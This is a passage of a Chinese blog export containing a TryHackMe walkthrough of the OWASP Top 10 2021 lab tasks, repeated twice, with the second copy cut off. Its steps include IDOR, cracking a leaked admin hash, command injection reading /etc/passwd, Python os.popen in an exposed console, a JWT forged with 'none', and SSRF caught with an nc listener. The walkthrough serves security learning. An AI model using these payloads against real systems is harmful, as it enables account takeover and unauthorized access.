top-1o！！！\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"tryhackme-OWASP-Top-10-2021上集","published":1,"updated":"2025-02-08T11:15:57.586Z","comments":1,"layout":"post","photos":[],"_id":"cm74njvxj000ztsg6b0dv458j","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><p>tryhackme的OWASP Top 10 的题目和记录</p>\n<p>OWASP Top 10 </p>\n<p>访问控制失效<br>加密失败<br>注入<br>不安全的设计<br>安全配置错误<br>易受攻击和过时的组件<br>识别和认证失败<br>软件和数据完整性故障<br>安全日志和监控失败<br>服务端请求伪造（SSRF）</p>\n<h2 id=\"1-访问控制失效\"><a href=\"#1-访问控制失效\" class=\"headerlink\" title=\"1.访问控制失效\"></a>1.访问控制失效</h2><p>攻击者可能通过绕过访问控制机制，获取未授权的资源或执行未授权的操作。</p>\n<p>IDOR 或不安全的直接对象引用是指一种访问控制漏洞，利用该漏洞您可以访问通常无法看到的资源。当程序员公开直接对象引用时就会发生这种情况，它只是指向服务器内特定对象的标识符。我们所说的对象可能是指文件、用户、银行应用程序中的银行账户或任何其他对象。</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/task1.png\" alt=\"task1\"></p>\n<p>我们进入题目要求的网站 用给的账户登录一下 、</p>\n<p>登进去后会就是显示普通的文本 但观察网址会发现后面有个note_id&#x3D;1这个字样 从零开始输 看看有没有可能出flag<br>第一个就出flag了</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/flag.png\" alt=\"task1\"></p>\n<h2 id=\"2-加密失败\"><a href=\"#2-加密失败\" class=\"headerlink\" title=\"2 加密失败\"></a>2 加密失败</h2><p>加密故障是指因误用（或未使用）用于保护敏感信息的加密算法而产生的任何漏洞。Web 应用程序需要加密技术来为其用户提供多层次的机密性。</p>\n<p>加密失败的第二部分 我们简单学习了一下下载数据库和查找数据库的有用信息 还有一个等下用得着的网站<a href=\"https://crackstation.net/\">crackstation</a></p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/task2.png\" alt=\"task2\"></p>\n<p>进入网站查看有什么问题吗</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/web.png\" alt=\"task2\"></p>\n<p>看看网站源码<br><img src=\"/images/tryhackme-OWASP-Top-10-2021/webdb0.png\" alt=\"task2\"></p>\n<p>发现有很多都是来自assets 在网址后面加个&#x2F;assets试试看</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/webdb.png\" alt=\"task2\"></p>\n<p>看到最后一个数据库文件 把他下过来。然后查看一下数据库里有什么重要文件</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/webdb0.5.png\" alt=\"task2\"></p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/webdb1.png\" alt=\"task2\"></p>\n<p>能找到admin的密码的hash值 拉到上面说的网站里面解密能知道明文密码</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/webdb3.png\" alt=\"task2\"></p>\n<p>在网站中登录admin账户就能发现flag</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/login.png\" alt=\"task2\"></p>\n<h2 id=\"3-注入\"><a href=\"#3-注入\" class=\"headerlink\" title=\"3 注入\"></a>3 注入</h2><p>包括sql注入 命令注入</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/task3.png\" alt=\"task3\"></p>\n<p>这个thm讲的是命令注入</p>\n<p>先输入$(ls)试试水</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/drpepper.png\" alt=\"task3\"></p>\n<p>试试看$(cat &#x2F;etc&#x2F;passwd | grep “usr”)查一下第二题说的用户</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/shell.png\" alt=\"task3\"></p>\n<p>但发现都是在&#x2F;sbin中 都属于root用户 所以说是零个用户 用户shell就是&#x2F;sbin&#x2F;shell</p>\n<p>查应用程序以什么用户身份运行？直接whoami</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/whoami.png\" alt=\"task3\"></p>\n<p>发现是apache用户</p>\n<p>查版本就 cat &#x2F;etc&#x2F;os-release</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/os-rease.png\" alt=\"task3\"></p>\n<p>是3.16.0版本</p>\n<h2 id=\"4-不安全的设计\"><a href=\"#4-不安全的设计\" class=\"headerlink\" title=\"4 不安全的设计\"></a>4 不安全的设计</h2><p>不安全的设计是指应用程序架构固有的漏洞。这些漏洞不是由于糟糕的实现或配置而导致的，而是整个应用程序（或其中的一部分）背后的理念从一开始就存在缺陷。</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/task4.png\" alt=\"task4\"></p>\n<p>进入网站 直接开始重置账户 选中间那个最喜欢的颜色<br>红黄蓝绿一直输 发现是绿色 重置成功。登录进去就能发现flag</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/green.png\" alt=\"task4\"></p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/greenflag.png\" alt=\"task4\"></p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/greenflag1.png\" alt=\"task4\"></p>\n<h2 id=\"5-安全配置错误\"><a href=\"#5-安全配置错误\" class=\"headerlink\" title=\"5 安全配置错误\"></a>5 安全配置错误</h2><p>安全配置错误与其他十大漏洞不同，因为它们发生在安全配置本来可以正确配置但实际上却没有配置的情况下。即使您下载了最新的软件，错误的配置也可能使您的安装变得脆弱。</p>\n<p>先进入网站尝尝<del>咸蛋</del>咸淡<br><img src=\"/images/tryhackme-OWASP-Top-10-2021/console.png\" alt=\"task5\"></p>\n<p>我们直接复制thm给出来的代码 在这里面跑跑</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/tododb.png\" alt=\"task5\"></p>\n<p>能发现数据库名字是todo.db</p>\n<p>根据thm的提示 我们稍微改改他给出来的命令 就能查出flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os; print(os.popen(&quot;cat app.py | grep &#x27;flag&#x27;&quot;).read())</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/py.png\" alt=\"task5\"></p>\n<h2 id=\"6-易受攻击和过时的组件\"><a href=\"#6-易受攻击和过时的组件\" class=\"headerlink\" title=\"6 易受攻击和过时的组件\"></a>6 易受攻击和过时的组件</h2><p>版本不及时更新的话容易遇到一下漏洞攻击</p>\n<p>进入网站看看 诶呦是个线上书店 直接把cse bookstore去谷歌搜索一下看有什么漏洞吗</p>\n<p>挺好 找到一个</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/looudong.png\" alt=\"task\"></p>\n<p>那他下载过来 直接跑一遍 漏洞利用成功，cat一下&#x2F;opt&#x2F;flag.txt 就能就能获得flag</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/books.png\" alt=\"task\"></p>\n<h2 id=\"7-身份识别和认证失败\"><a href=\"#7-身份识别和认证失败\" class=\"headerlink\" title=\"7 身份识别和认证失败\"></a>7 身份识别和认证失败</h2><p>身份验证和会话管理是现代 Web 应用程序的核心组件。身份验证允许用户通过验证其身份来访问 Web 应用程序。最常见的身份验证形式是使用用户名和密码机制。用户输入这些凭据，然后服务器验证它们。如果它们正确，服务器将向用户的浏览器提供会话 cookie 。需要会话 cookie 是因为 Web 服务器使用HTTP (S) 进行通信，而 HTTP (S) 是无状态的。附加会话 cookie 意味着服务器将知道谁在发送什么数据。然后服务器可以跟踪用户的操作。</p>\n<p>身份验证机制中的一些常见缺陷包括：</p>\n<ul>\n<li>暴力攻击</li>\n<li>使用弱凭证</li>\n<li>弱会话 Cookie。</li>\n</ul>\n<p>看看题目</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/task7.png\" alt=\"task7\"></p>\n<p>进入网站看看 说是要先注册一个darren的账户 </p>\n<p>你会发现注册darren的话 会说明账户已存在 </p>\n<p>在注册账户的时候 在darren的d的前面加一个空格再来照常注册 发现注册成功 </p>\n<p>用刚才的账户密码就能登录darren账户找到flag</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/login1.png\" alt=\"task7\"></p>\n<p>arthur也是一样的操作</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/arthur.png\" alt=\"task7\"></p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/arthur1.png\" alt=\"task7\"></p>\n<h2 id=\"软件和数据完整性故障\"><a href=\"#软件和数据完整性故障\" class=\"headerlink\" title=\"软件和数据完整性故障\"></a>软件和数据完整性故障</h2><p>此漏洞源自使用未使用任何完整性检查的软件或数据的代码或基础架构。由于未进行完整性验证，攻击者可能会修改传递给应用程序的软件或数据，从而导致意外后果。此类别中主要有两种类型的漏洞：</p>\n<ul>\n<li>软件完整性故障</li>\n<li>数据完整性故障</li>\n</ul>\n<h3 id=\"软件完整性故障\"><a href=\"#软件完整性故障\" class=\"headerlink\" title=\"软件完整性故障\"></a>软件完整性故障</h3><p>来看看thm的题目 这里讲的是 jQuery<br>如果你愿意，你可以直接从他们的服务器将 jQuery 包含在你的网站中，而无需实际下载它，只需在你网站的 HTML 代码中包含以下行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=&quot;https://code.jquery.com/jquery-3.6.1.min.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>当用户导航到您的网站时，其浏览器将读取其 HTML 代码并从指定的外部源下载 jQuery。</p>\n<p>如果攻击者以某种方式入侵 jQuery 官方存储库，他们可以更改内容<code>https://code.jquery.com/jquery-3.6.1.min.js</code> 以注入恶意代码。</p>\n<p>题目</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/task8.0.png\" alt=\"task8\"></p>\n<p>将<a href=\"https://code.jquery.com/jquery-1.12.4.min.js%E8%BD%AC%E6%88%90SHA-256%E7%9A%84%E5%BD%A2%E5%BC%8F\">https://code.jquery.com/jquery-1.12.4.min.js转成SHA-256的形式</a></p>\n<p><a href=\"https://www.srihash.org/\">来这里</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://code.jquery.com/jquery-1.12.4.min.js</span><br></pre></td></tr></table></figure>\n\n<p>进入网站就能转化成SHA-256 这个就答案</p>\n<h3 id=\"数据完整性故障\"><a href=\"#数据完整性故障\" class=\"headerlink\" title=\"数据完整性故障\"></a>数据完整性故障</h3><p>通常，当用户登录应用程序时，他们会被分配某种会话令牌，该令牌需要在会话持续期间保存在浏览器中。此令牌将在每个后续请求中重复，以便 Web 应用程序知道我们是谁。这些会话令牌可以有多种形式，但通常通过 Cookie 分配。Cookie是Web 应用程序将存储在用户浏览器中的键值对，并且将在每次向发出它们的网站发出请求时自动重复。</p>\n<p>如果您正在创建一个 Web 邮件应用程序，您可以在登录后为每个用户分配一个包含其用户名的 Cookie。在后续请求中，您的浏览器将始终在 Cookie 中发送您的用户名，以便您的 Web 应用程序知道哪个用户正在连接。</p>\n<p>因此如果用户篡改 Cookie 并更改用户名，他们可能会冒充其他人并阅读他们的电子邮件！此应用程序将遭受数据完整性故障，因为它信任攻击者可以篡改的数据。</p>\n<p>解决此问题的一个方法是使用某种完整性机制来保证 cookie 未被用户更改。为了避免重复工作，我们可以使用一些允许您执行此操作的令牌实现，并处理所有加密以提供完整性证明，而无需您为此操心。JSON Web 令牌 (JWT)就是这样一种实现。</p>\n<p>看题目</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/task8.png\" alt=\"task8\"></p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/task8.1.png\" alt=\"task8\"></p>\n<p>进入网站 guest随便输入一次 报错就知道密码了</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/cookie.png\" alt=\"task8\"></p>\n<p>进去之后f12找出jwt</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/cookieflag.png\" alt=\"task8\"></p>\n<p>把hs256改成none 用户名改成admin</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/jwt.png\" alt=\"task8\"></p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/jwt1.png\" alt=\"task8\"></p>\n<p>改好的这两个参数重新转化为base64</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/jwt2.png\" alt=\"task8\"></p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/jwt3.png\" alt=\"task8\"></p>\n<p>把这个粘贴在一起 用.间隔。最后面也要用.结尾</p>\n<p>把jwt代替之前的jwt 刷新一下就有flag了</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/cookieflag1.png\" alt=\"flag\"></p>\n<h2 id=\"9-安全日志和监控失败\"><a href=\"#9-安全日志和监控失败\" class=\"headerlink\" title=\"9 安全日志和监控失败\"></a>9 安全日志和监控失败</h2><p>设置 Web 应用程序时，应记录用户执行的每个操作。记录很重要，因为一旦发生事件，攻击者的活动就会被追踪。一旦追踪到他们的行为，就可以确定他们的风险和影响。如果没有记录，就无法知道攻击者在获得特定 Web 应用程序的访问权限后执行了哪些操作。</p>\n<p>日志中存储的信息应包括以下内容：</p>\n<ul>\n<li>HTTP状态代码</li>\n<li>时间戳</li>\n<li>用户名</li>\n<li>API端点&#x2F;页面位置</li>\n<li>IP 地址</li>\n</ul>\n<p>下载日志看看</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/task9.png\" alt=\"task9\"></p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/log.png\" alt=\"task9\"></p>\n<p>看到连续几个相同的ip盲猜就是攻击者ip</p>\n<p>这样看的话就是暴力破解</p>\n<h2 id=\"10-服务器端请求伪造（SSRF）\"><a href=\"#10-服务器端请求伪造（SSRF）\" class=\"headerlink\" title=\"10 服务器端请求伪造（SSRF）\"></a>10 服务器端请求伪造（SSRF）</h2><p>这种类型的漏洞发生在攻击者可以强迫 Web 应用程序代表他们向任意目的地发送请求，同时控制请求本身的内容时。SSRF漏洞通常出现在我们的 Web 应用程序需要使用第三方服务的实现中。</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/task10.png\" alt=\"task10\"></p>\n<p>依旧进入网站 发现是个类似博客的东西 周围找找看有什么可以做的吗</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/admin.png\" alt=\"task10\"></p>\n<p>点进去发现 要localhost才能进去</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/localhost.png\" alt=\"task\"></p>\n<p>第二问 问点击下载按钮。服务器参数指向哪里？</p>\n<p>直接f12 找到下载按钮 发现了下载路径</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/down.png\" alt=\"task\"></p>\n<p>这个路径也有大作用 正常来说我们下载那个pdf使用这个路径</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://10.10.234.129:8087/download?server=secure-file-storage.com:8087&amp;id=75482342</span><br></pre></td></tr></table></figure>\n\n<p>我们要把后面的server&#x3D;的值改成attackbox或者是你虚拟机连openvpn的ip 其他都不动</p>\n<p>然后打开终端 设置监听 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvnp 8087</span><br></pre></td></tr></table></figure>\n\n<p>启动完就把改好的网址在浏览器那搜索一下 终端就能找到flag</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/api1.png\" alt=\"ask\"></p>\n<p>于是乎 把thm的owasp top-10简单介绍一下了 过段时间继续学习更新owasp top-1o！！！</p>\n","excerpt":"","more":"<p>tryhackme的OWASP Top 10 的题目和记录</p>\n<p>OWASP Top 10 </p>\n<p>访问控制失效<br>加密失败<br>注入<br>不安全的设计<br>安全配置错误<br>易受攻击和过时的组件<br>识别和认证失败<br>软件和数据完整性故障<br>安全日志和监控失败<br>服务端请求伪造（SSRF）</p>\n<h2 id=\"1-访问控制失效\"><a href=\"#1-访问控制失效\" class=\"headerlink\" title=\"1.访问控制失效\"></a>1.访问控制失效</h2><p>攻击者可能通过绕过访问控制机制，获取未授权的资源或执行未授权的操作。</p>\n<p>IDOR 或不安全的直接对象引用是指一种访问控制漏洞，利用该漏洞您可以访问通常无法看到的资源。当程序员公开直接对象引用时就会发生这种情况，它只是指向服务器内特定对象的标识符。我们所说的对象可能是指文件、用户、银行应用程序中的银行账户或任何其他对象。</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/task1.png\" alt=\"task1\"></p>\n<p>我们进入题目要求的网站 用给的账户登录一下 、</p>\n<p>登进去后会就是显示普通的文本 但观察网址会发现后面有个note_id&#x3D;1这个字样 从零开始输 看看有没有可能出flag<br>第一个就出flag了</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/flag.png\" alt=\"task1\"></p>\n<h2 id=\"2-加密失败\"><a href=\"#2-加密失败\" class=\"headerlink\" title=\"2 加密失败\"></a>2 加密失败</h2><p>加密故障是指因误用（或未使用）用于保护敏感信息的加密算法而产生的任何漏洞。Web 应用程序需要加密技术来为其用户提供多层次的机密性。</p>\n<p>加密失败的第二部分 我们简单学习了一下下载数据库和查找数据库的有用信息 还有一个等下用得着的网站<a href=\"https://crackstation.net/\">crackstation</a></p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/task2.png\" alt=\"task2\"></p>\n<p>进入网站查看有什么问题吗</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/web.png\" alt=\"task2\"></p>\n<p>看看网站源码<br><img src=\"/images/tryhackme-OWASP-Top-10-2021/webdb0.png\" alt=\"task2\"></p>\n<p>发现有很多都是来自assets 在网址后面加个&#x2F;assets试试看</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/webdb.png\" alt=\"task2\"></p>\n<p>看到最后一个数据库文件 把他下过来。然后查看一下数据库里有什么重要文件</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/webdb0.5.png\" alt=\"task2\"></p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/webdb1.png\" alt=\"task2\"></p>\n<p>能找到admin的密码的hash值 拉到上面说的网站里面解密能知道明文密码</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/webdb3.png\" alt=\"task2\"></p>\n<p>在网站中登录admin账户就能发现flag</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/login.png\" alt=\"task2\"></p>\n<h2 id=\"3-注入\"><a href=\"#3-注入\" class=\"headerlink\" title=\"3 注入\"></a>3 注入</h2><p>包括sql注入 命令注入</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/task3.png\" alt=\"task3\"></p>\n<p>这个thm讲的是命令注入</p>\n<p>先输入$(ls)试试水</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/drpepper.png\" alt=\"task3\"></p>\n<p>试试看$(cat &#x2F;etc&#x2F;passwd | grep “usr”)查一下第二题说的用户</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/shell.png\" alt=\"task3\"></p>\n<p>但发现都是在&#x2F;sbin中 都属于root用户 所以说是零个用户 用户shell就是&#x2F;sbin&#x2F;shell</p>\n<p>查应用程序以什么用户身份运行？直接whoami</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/whoami.png\" alt=\"task3\"></p>\n<p>发现是apache用户</p>\n<p>查版本就 cat &#x2F;etc&#x2F;os-release</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/os-rease.png\" alt=\"task3\"></p>\n<p>是3.16.0版本</p>\n<h2 id=\"4-不安全的设计\"><a href=\"#4-不安全的设计\" class=\"headerlink\" title=\"4 不安全的设计\"></a>4 不安全的设计</h2><p>不安全的设计是指应用程序架构固有的漏洞。这些漏洞不是由于糟糕的实现或配置而导致的，而是整个应用程序（或其中的一部分）背后的理念从一开始就存在缺陷。</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/task4.png\" alt=\"task4\"></p>\n<p>进入网站 直接开始重置账户 选中间那个最喜欢的颜色<br>红黄蓝绿一直输 发现是绿色 重置成功。登录进去就能发现flag</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/green.png\" alt=\"task4\"></p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/greenflag.png\" alt=\"task4\"></p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/greenflag1.png\" alt=\"task4\"></p>\n<h2 id=\"5-安全配置错误\"><a href=\"#5-安全配置错误\" class=\"headerlink\" title=\"5 安全配置错误\"></a>5 安全配置错误</h2><p>安全配置错误与其他十大漏洞不同，因为它们发生在安全配置本来可以正确配置但实际上却没有配置的情况下。即使您下载了最新的软件，错误的配置也可能使您的安装变得脆弱。</p>\n<p>先进入网站尝尝<del>咸蛋</del>咸淡<br><img src=\"/images/tryhackme-OWASP-Top-10-2021/console.png\" alt=\"task5\"></p>\n<p>我们直接复制thm给出来的代码 在这里面跑跑</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/tododb.png\" alt=\"task5\"></p>\n<p>能发现数据库名字是todo.db</p>\n<p>根据thm的提示 我们稍微改改他给出来的命令 就能查出flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os; print(os.popen(&quot;cat app.py | grep &#x27;flag&#x27;&quot;).read())</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/py.png\" alt=\"task5\"></p>\n<h2 id=\"6-易受攻击和过时的组件\"><a href=\"#6-易受攻击和过时的组件\" class=\"headerlink\" title=\"6 易受攻击和过时的组件\"></a>6 易受攻击和过时的组件</h2><p>版本不及时更新的话容易遇到一下漏洞攻击</p>\n<p>进入网站看看 诶呦是个线上书店 直接把cse bookstore去谷歌搜索一下看有什么漏洞吗</p>\n<p>挺好 找到一个</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/looudong.png\" alt=\"task\"></p>\n<p>那他下载过来 直接跑一遍 漏洞利用成功，cat一下&#x2F;opt&#x2F;flag.txt 就能就能获得flag</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/books.png\" alt=\"task\"></p>\n<h2 id=\"7-身份识别和认证失败\"><a href=\"#7-身份识别和认证失败\" class=\"headerlink\" title=\"7 身份识别和认证失败\"></a>7 身份识别和认证失败</h2><p>身份验证和会话管理是现代 Web 应用程序的核心组件。身份验证允许用户通过验证其身份来访问 Web 应用程序。最常见的身份验证形式是使用用户名和密码机制。用户输入这些凭据，然后服务器验证它们。如果它们正确，服务器将向用户的浏览器提供会话 cookie 。需要会话 cookie 是因为 Web 服务器使用HTTP (S) 进行通信，而 HTTP (S) 是无状态的。附加会话 cookie 意味着服务器将知道谁在发送什么数据。然后服务器可以跟踪用户的操作。</p>\n<p>身份验证机制中的一些常见缺陷包括：</p>\n<ul>\n<li>暴力攻击</li>\n<li>使用弱凭证</li>\n<li>弱会话 Cookie。</li>\n</ul>\n<p>看看题目</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/task7.png\" alt=\"task7\"></p>\n<p>进入网站看看 说是要先注册一个darren的账户 </p>\n<p>你会发现注册darren的话 会说明账户已存在 </p>\n<p>在注册账户的时候 在darren的d的前面加一个空格再来照常注册 发现注册成功 </p>\n<p>用刚才的账户密码就能登录darren账户找到flag</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/login1.png\" alt=\"task7\"></p>\n<p>arthur也是一样的操作</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/arthur.png\" alt=\"task7\"></p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/arthur1.png\" alt=\"task7\"></p>\n<h2 id=\"软件和数据完整性故障\"><a href=\"#软件和数据完整性故障\" class=\"headerlink\" title=\"软件和数据完整性故障\"></a>软件和数据完整性故障</h2><p>此漏洞源自使用未使用任何完整性检查的软件或数据的代码或基础架构。由于未进行完整性验证，攻击者可能会修改传递给应用程序的软件或数据，从而导致意外后果。此类别中主要有两种类型的漏洞：</p>\n<ul>\n<li>软件完整性故障</li>\n<li>数据完整性故障</li>\n</ul>\n<h3 id=\"软件完整性故障\"><a href=\"#软件完整性故障\" class=\"headerlink\" title=\"软件完整性故障\"></a>软件完整性故障</h3><p>来看看thm的题目 这里讲的是 jQuery<br>如果你愿意，你可以直接从他们的服务器将 jQuery 包含在你的网站中，而无需实际下载它，只需在你网站的 HTML 代码中包含以下行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=&quot;https://code.jquery.com/jquery-3.6.1.min.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>当用户导航到您的网站时，其浏览器将读取其 HTML 代码并从指定的外部源下载 jQuery。</p>\n<p>如果攻击者以某种方式入侵 jQuery 官方存储库，他们可以更改内容<code>https://code.jquery.com/jquery-3.6.1.min.js</code> 以注入恶意代码。</p>\n<p>题目</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/task8.0.png\" alt=\"task8\"></p>\n<p>将<a href=\"https://code.jquery.com/jquery-1.12.4.min.js%E8%BD%AC%E6%88%90SHA-256%E7%9A%84%E5%BD%A2%E5%BC%8F\">https://code.jquery.com/jquery-1.12.4.min.js转成SHA-256的形式</a></p>\n<p><a href=\"https://www.srihash.org/\">来这里</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://code.jquery.com/jquery-1.12.4.min.js</span><br></pre></td></tr></table></figure>\n\n<p>进入网站就能转化成SHA-256 这个就答案</p>\n<h3 id=\"数据完整性故障\"><a href=\"#数据完整性故障\" class=\"headerlink\" title=\"数据完整性故障\"></a>数据完整性故障</h3><p>通常，当用户登录应用程序时，他们会被分配某种会话令牌，该令牌需要在会话持续期间保存在浏览器中。此令牌将在每个后续请求中重复，以便 Web 应用程序知道我们是谁。这些会话令牌可以有多种形式，但通常通过 Cookie 分配。Cookie是Web 应用程序将存储在用户浏览器中的键值对，并且将在每次向发出它们的网站发出请求时自动重复。</p>\n<p>如果您正在创建一个 Web 邮件应用程序，您可以在登录后为每个用户分配一个包含其用户名的 Cookie。在后续请求中，您的浏览器将始终在 Cookie 中发送您的用户名，以便您的 Web 应用程序知道哪个用户正在连接。</p>\n<p>因此如果用户篡改 Cookie 并更改用户名，他们可能会冒充其他人并阅读他们的电子邮件！此应用程序将遭受数据完整性故障，因为它信任攻击者可以篡改的数据。</p>\n<p>解决此问题的一个方法是使用某种完整性机制来保证 cookie 未被用户更改。为了避免重复工作，我们可以使用一些允许您执行此操作的令牌实现，并处理所有加密以提供完整性证明，而无需您为此操心。JSON Web 令牌 (JWT)就是这样一种实现。</p>\n<p>看题目</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/task8.png\" alt=\"task8\"></p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/task8.1.png\" alt=\"task8\"></p>\n<p>进入网站 guest随便输入一次 报错就知道密码了</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/cookie.png\" alt=\"task8\"></p>\n<p>进去之后f12找出jwt</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/cookieflag.png\" alt=\"task8\"></p>\n<p>把hs256改成none 用户名改成admin</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/jwt.png\" alt=\"task8\"></p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/jwt1.png\" alt=\"task8\"></p>\n<p>改好的这两个参数重新转化为base64</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/jwt2.png\" alt=\"task8\"></p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/jwt3.png\" alt=\"task8\"></p>\n<p>把这个粘贴在一起 用.间隔。最后面也要用.结尾</p>\n<p>把jwt代替之前的jwt 刷新一下就有flag了</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/cookieflag1.png\" alt=\"flag\"></p>\n<h2 id=\"9-安全日志和监控失败\"><a href=\"#9-安全日志和监控失败\" class=\"headerlink\" title=\"9 安全日志和监控失败\"></a>9 安全日志和监控失败</h2><p>设置 Web 